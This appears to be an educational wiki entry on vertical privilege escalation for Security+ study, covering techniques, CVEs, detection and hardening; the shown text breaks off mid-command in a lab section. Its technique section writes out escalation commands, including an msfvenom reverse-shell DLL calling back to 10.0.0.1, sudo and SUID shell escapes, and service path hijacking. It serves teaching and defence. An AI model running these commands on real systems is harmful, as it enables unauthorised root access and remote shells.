---
domain: "cybersecurity/attacks"
tags: [privilege-escalation, access-control, post-exploitation, lateral-movement, vulnerability-exploitation, authorization]
---
# Vertical Privilege Escalation

**Vertical privilege escalation** (also called **elevation of privilege**) is an attack in which a user or process gains access to permissions, roles, or capabilities beyond those legitimately assigned to them — typically moving from a low-privileged account to a higher one such as administrator or root. It is a critical phase of the [[Post-Exploitation]] lifecycle and is frequently chained with [[Lateral Movement]] to achieve full [[Domain Compromise]]. The attack exploits failures in [[Access Control]], misconfigured systems, or software vulnerabilities to cross security boundaries that should be enforced by the operating system or application.

---
## Overview

Vertical privilege escalation exists because modern computing systems are built on the principle of layered trust — not every user or process should have equal authority over system resources. Operating systems implement this through mechanisms like Unix [[File Permissions]], Windows [[Access Control Lists (ACLs)]], and [[Role-Based Access Control (RBAC)]]. When these mechanisms are poorly configured, contain software bugs, or are bypassed through logical flaws, an attacker operating at a restricted level can "climb" the privilege ladder to gain capabilities they should not possess.

The attack is especially dangerous because it often follows initial access as the second stage of a kill chain. An attacker who gains a foothold via a phishing link or web shell may initially land in a low-privilege user context — perhaps a web server process running as `www-data` or a standard Windows domain user. Vertical privilege escalation transforms this beachhead from a limited vantage point into one with administrative authority, enabling the attacker to install persistence mechanisms, disable security tools, exfiltrate sensitive data, and propagate throughout the network.

The attack surface for vertical privilege escalation is enormous and spans operating systems, applications, kernel space, hypervisors, and cloud control planes. Vulnerabilities enabling it have been present in every major operating system. Famous examples include the Windows [[PrintNightmare]] vulnerability (CVE-2021-1675/CVE-2021-34527), the Linux [[Dirty COW]] exploit (CVE-2016-5195), and the [[Polkit]] pkexec vulnerability (CVE-2021-4034, also called PwnKit), all of which allowed unprivileged users to achieve root or SYSTEM-level execution.

In enterprise environments, vertical privilege escalation is often the pivot point between a nuisance incident and a catastrophic breach. Attackers who successfully escalate to Domain Admin in an Active Directory environment gain the ability to create backdoor accounts, dump all credential hashes, and establish persistent access that can survive password resets. This is why privilege escalation is listed as a core tactic (TA0004) in the [[MITRE ATT&CK Framework]] with dozens of documented techniques.

---
## How It Works

Vertical privilege escalation can be achieved through many distinct technical pathways. Below are the most common mechanisms with practical detail.

### 1. Exploiting SUID/SGID Binaries (Linux)

Set-User-ID (SUID) binaries run with the privileges of the file owner, not the caller. If a binary owned by root has the SUID bit set and is exploitable, an attacker can gain root execution.

```bash
# Find all SUID binaries on a Linux system
find / -perm -4000 -type f 2>/dev/null

# Example: nmap with SUID (old versions had interactive mode)
nmap --interactive
# Inside nmap interactive:
!sh
# Result: root shell
```

Many legitimate tools like `passwd` and `sudo` use SUID by design, but misconfigurations — such as setting the SUID bit on `bash`, `vim`, `python`, or custom scripts — create trivial escalation paths.

### 2. Sudo Misconfiguration (Linux)

The `sudoers` file defines what commands users may run as other users. Overly permissive entries create escalation opportunities.

```bash
# Check current sudo permissions
sudo -l

# Example vulnerable sudoers entry:
# user ALL=(ALL) NOPASSWD: /usr/bin/vim

# Exploit: vim can launch a shell
sudo vim -c ':!/bin/bash'
```

The GTFOBins project (gtfobins.github.io) documents escalation techniques for over 100 Unix binaries that can be abused when granted via `sudo`.

### 3. Windows Token Impersonation

Windows uses access tokens to determine what a process or thread can do. Certain privileges — particularly `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` — allow a process to impersonate tokens belonging to higher-privileged accounts. Service accounts often hold `SeImpersonatePrivilege` by design.

```powershell
# Check current token privileges
whoami /priv

# Tools like PrintSpoofer, RoguePotato, and JuicyPotato abuse this
# Example using PrintSpoofer on a service account shell:
.\PrintSpoofer64.exe -i -c cmd
# Result: SYSTEM shell
```

The "Potato" family of exploits (HotPotato, RottenPotato, JuicyPotato, SweetPotato, RoguePotato) all exploit variations of COM server impersonation to abuse these privileges.

### 4. DLL Hijacking (Windows)

Windows searches for DLLs in a predictable order. If an attacker can plant a malicious DLL in a directory that is searched before the legitimate DLL location, and a privileged process loads it, code execution occurs in that privileged context.

```powershell
# Use Process Monitor (Sysinternals) to find DLL search failures:
# Filter: Result = "NAME NOT FOUND" and Path ends with ".dll"

# Check write permissions on directories in the DLL search path
icacls "C:\Program Files\VulnerableApp\"

# Create malicious DLL with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f dll -o missing_dependency.dll
```

### 5. Kernel Exploits

Unpatched kernel vulnerabilities allow code running in user space to execute within the kernel, gaining full system control. Dirty COW (CVE-2016-5195) exploited a race condition in the Linux kernel's copy-on-write mechanism.

```bash
# Check kernel version
uname -a
# Example: Linux target 4.4.0-116-generic

# Search for matching exploits
searchsploit linux kernel 4.4 privilege escalation

# Compile and run (example flow, not production commands)
gcc dirtycow.c -o dirtycow -pthread
./dirtycow /etc/passwd <new_root_line>
```

### 6. Weak Service Permissions (Windows)

Windows services run under specific accounts. If a low-privilege user can modify a service's binary path or reconfigure the service itself, they can redirect it to execute arbitrary code as SYSTEM.

```powershell
# Use accesschk to find vulnerable services
.\accesschk64.exe -uwcqv "Authenticated Users" * /accepteula

# Modify vulnerable service binary path
sc config VulnerableService binPath= "C:\temp\malicious.exe"
sc stop VulnerableService
sc start VulnerableService
```

---
## Key Concepts

- **Principle of Least Privilege (PoLP):** The foundational security principle that every user, process, and system component should operate with the minimum permissions necessary for its function. Violations of PoLP create the conditions that make vertical privilege escalation possible.

- **SUID/SGID Bit:** Unix/Linux file permission flags that cause an executable to run with the privileges of the file owner (SUID) or group owner (SGID) rather than the invoking user. Critical for legitimate tools like `passwd` but a major risk when applied to interactive programs or scripts.

- **Access Token (Windows):** A kernel object that describes the security context of a process or thread — including the user account, group memberships, and privileges. Privilege escalation on Windows frequently involves stealing, duplicating, or impersonating tokens belonging to higher-privileged accounts.

- **sudoers Misconfiguration:** An incorrect entry in `/etc/sudoers` that grants a user the ability to run commands as root beyond what their role requires. Common mistakes include `NOPASSWD` entries for general-purpose programs (editors, interpreters) that can spawn shells.

- **Unquoted Service Path:** A Windows vulnerability where a service's executable path contains spaces and is not enclosed in quotation marks. Windows will attempt to execute path fragments sequentially, allowing an attacker who can write to an intermediate directory to inject a malicious executable.

- **Token Impersonation:** The act of assuming the security context of another user's access token. Legitimate for services handling multiple users but exploitable when an unprivileged process can force a privileged process to authenticate to it, then steal the resulting token.

- **Privilege Escalation Enumeration:** The systematic process of fingerprinting a compromised system for escalation opportunities — including OS version, installed software, scheduled tasks, running services, sudo permissions, writable directories, and network configuration. Tools like [[LinPEAS]], [[WinPEAS]], and [[PowerUp]] automate this process.

---
## Exam Relevance

**SY0-701 Exam Tips:**

- Privilege escalation is explicitly covered under **Domain 4.0 – Security Operations** (specifically threat activity monitoring and indicators of compromise) and **Domain 2.0 – Threats, Vulnerabilities, and Mitigations**.

- Know the difference between **vertical** privilege escalation (gaining higher privileges, e.g., user → admin) and **[[Horizontal Privilege Escalation]]** (accessing another account at the same privilege level, e.g., user A accessing user B's data). The exam will test your ability to distinguish these.

- **Common question pattern:** A scenario describes a user who can access files belonging to the administrator account without authorization — identify whether this is vertical or horizontal escalation. If they gained *admin-level capabilities*, it is vertical.

- Know that **least privilege** and **separation of duties** are the primary *preventive* controls against privilege escalation. **Privileged Access Workstations (PAWs)** and **just-in-time access** are mentioned in the context of reducing escalation risk.

- The exam may reference **rootkits** as a post-escalation persistence mechanism — understand the relationship: rootkits typically *require* successful privilege escalation before installation.

- **Gotcha:** Students often confuse privilege escalation with **initial access**. Escalation assumes the attacker is already on the system; it is about what they can *do* once there, not *how they got there*.

- Understand that **application-layer** privilege escalation (e.g., a web app user bypassing authorization to access admin functions) is also vertical privilege escalation — not just OS-level attacks.

---
## Security Implications

### Vulnerabilities and CVEs

| CVE | Name | Description | Impact |
|---|---|---|---|
| CVE-2016-5195 | Dirty COW | Linux kernel race condition in copy-on-write | Local → root on most Linux kernels pre-4.8.3 |
| CVE-2021-4034 | PwnKit | Buffer overflow in Polkit `pkexec` | Local → root on all major Linux distros |
| CVE-2021-1675 | PrintNightmare | Windows Print Spooler RCE + LPE | Local → SYSTEM or remote code execution |
| CVE-2020-1472 | Zerologon | Netlogon protocol flaw | Domain user → Domain Admin |
| CVE-2019-0841 | Windows AppX Deployment | Windows 10 LPE via AppX Deployment Service | Local user → SYSTEM |
| CVE-2021-3560 | Polkit D-Bus race | Race condition in Polkit authentication | Local → root |

### Real-World Incidents

- **Colonial Pipeline (2021):** The ransomware operators (DarkSide) used credential-based privilege escalation to move from a VPN account to domain administrator before deploying ransomware, causing a shutdown of fuel delivery across the US East Coast.

- **SolarWinds Supply Chain Attack (2020):** Post-compromise activity heavily relied on escalating from the NETWORK SERVICE account under which the SolarWinds Orion service ran to gain broader access within victim environments.

### Detection Opportunities

- Anomalous process creation events where a child process has a higher integrity level than the parent (Windows Event ID 4688)
- Execution of known escalation tools: `whoami /priv`, `accesschk.exe`, `linpeas.sh`, `winpeas.exe`
- SUID binary execution by unexpected users (Linux `auditd` rules)
- `sudo` usage for uncommon commands (logged in `/var/log/auth.log`)
- New local administrator account creation (Windows Event ID 4720 + 4732)
- Token impersonation events (Windows Event ID 4624 logon type 3 with elevated token)

---
## Defensive Measures

### Least Privilege Enforcement
- Audit all user accounts and service accounts quarterly; remove unnecessary group memberships
- Use **Privileged Identity Management (PIM)** solutions (e.g., Microsoft Entra PIM, CyberArk) to enforce just-in-time elevated access
- Configure Windows services to run as dedicated low-privilege service accounts, never as SYSTEM or LocalAdmin unless required

### Linux Hardening
```bash
# Audit SUID binaries and remove unnecessary ones
find / -perm -4000 -type f 2>/dev/null | tee /root/suid_audit.txt
chmod u-s /path/to/unnecessary/suid/binary

# Restrict sudo to specific commands only; avoid NOPASSWD for interactive programs
# Correct sudoers entry:
user ALL=(ALL) /usr/bin/systemctl restart nginx

# Enable and configure auditd to log privilege escalation attempts
apt install auditd
auditctl -a always,exit -F arch=b64 -S setuid -S setgid -k privilege_escalation
```

### Windows Hardening
```powershell
# Enable and configure Windows Defender Credential Guard
# Prevents token theft via LSASS
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" `
  -Name "LsaCfgFlags" -Value 1

# Restrict who can load drivers (limits kernel exploit surface)
# Use WDAC (Windows Defender Application Control) policies

# Audit service permissions regularly
Get-WmiObject Win32_Service | Select-Object Name, StartName | 
  Where-Object {$_.StartName -eq "LocalSystem"} | 
  Export-Csv system_services.csv
```

### Patch Management
- Prioritize OS and kernel patches; many privilege escalation exploits target unpatched local vulnerabilities
- Implement **vulnerability scanning** with tools like [[Nessus]], [[OpenVAS]], or [[Qualys]] with authenticated scanning to detect local privilege escalation CVEs
- Track CISA's Known Exploited Vulnerabilities (KEV) catalog for actively exploited escalation bugs

### Application-Level Controls
- Implement server-side authorization checks; never rely solely on client-side role data
- Validate all user-supplied role or permission identifiers server-side on every request
- Use [[Web Application Firewalls (WAF)]] to detect parameter manipulation patterns

### Monitoring and Detection
- Deploy [[SIEM]] rules alerting on: new local admin accounts, SUID binary modifications, `sudo` commands outside approved list, and `SeImpersonatePrivilege` token events
- Implement [[EDR]] solutions (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint) with behavior-based detection for escalation tool signatures
- Enable **Sysmon** on Windows endpoints with configuration rules targeting process injection and privilege token events

---
## Lab / Hands-On

### Environment Setup
Use a dedicated vulnerable VM — **TryHackMe**, **HackTheBox**, or locally deploy **VulnHub** machines such as "Basic Pentesting" or "Lin.Security" for Linux escalation, and "HardeningKillerBox" for Windows.

### Linux Privilege Escalation Lab

```bash
# Step 1: Deploy a Kali Linux attacker VM and a vulnerable Ubuntu target
# Target: Ubuntu 16.04 (contains multiple escalation vectors)

# Step 2: Obtain a low-privilege shell on the target (simulate initial access)
ssh lowpriv@192.168.56.